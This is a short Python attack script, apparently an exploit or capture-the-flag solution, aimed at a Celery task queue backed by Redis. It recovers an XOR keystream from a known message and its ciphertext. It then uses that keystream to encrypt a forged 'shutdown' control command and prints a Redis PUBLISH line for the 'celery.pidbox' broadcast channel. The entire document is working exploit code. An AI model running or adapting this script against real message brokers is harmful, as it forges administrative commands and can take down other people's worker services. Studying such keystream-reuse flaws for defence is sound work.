import base64

plaintext = '''
[[],{"message":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},{"callbacks":null,"errbacks":null,"chain":null,"chord":null}]
'''.strip().encode()

s = '''37l7U7TSdwgKDFsvK2YIKZlkMmIzppixGrlujYwE7nsl+EjsnZUlBFH7yoA4nU4ifDsgkojm8tdbhDgOmpEkheEqt21V5A5YlgyfcTxnjkXeFKLQuSQ9w7bwBedEmPzJgB11nQblhHhlrD1YPwda6wY8USA2/OyUz+gw38TVPw8ksQ50V42mDvPSU+g='''.strip()


cipher = base64.b64decode(s)

key_stream = []

min_length = min(len(plaintext), len(cipher))
for i in range(min_length):
    c = cipher[i]
    p = plaintext[i]
    k = c ^ p
    key_stream.append(k)

data = '{"method":"shutdown","arguments":{}}'.encode()

def e_with_key(data : bytes):
    """XOR `data` with the recovered `key_stream` and return the resulting bytes.

    Previously this function only iterated up to the keystream length and
    truncated the rest of `data`, producing a shorter (malformed) payload.
    That truncation resulted in an unterminated JSON string when the
    receiver attempted to decode the message.

    We now XOR the entire `data`. If `key_stream` is shorter than `data`,
    we repeat the keystream cyclically (i % len(key_stream)).
    """
    data_length = len(data)
    ks_len = len(key_stream)
    if ks_len == 0:
        raise ValueError("key_stream is empty")

    out = bytearray(data_length)
    for i in range(data_length):
        out[i] = data[i] ^ key_stream[i % ks_len]

    return bytes(out)

out = e_with_key(data)
out_str = base64.b64encode(out).decode()
REDIS_CMD = """PUBLISH /0.celery.pidbox '{"body": "<BASE64_DATA>", "content-encoding": "binary", "content-type": "application/x-miniws", "headers": {"clock": 1, "expires": 1861891032.9756505}, "properties": {"delivery_mode": 2, "delivery_info": {"exchange": "celery.pidbox", "routing_key": ""}, "priority": 0, "body_encoding": "base64", "delivery_tag": "e9cb2a03-3968-4a48-a3ea-ca7ba413c012"}}'
""".strip().replace("<BASE64_DATA>", out_str)

print(REDIS_CMD)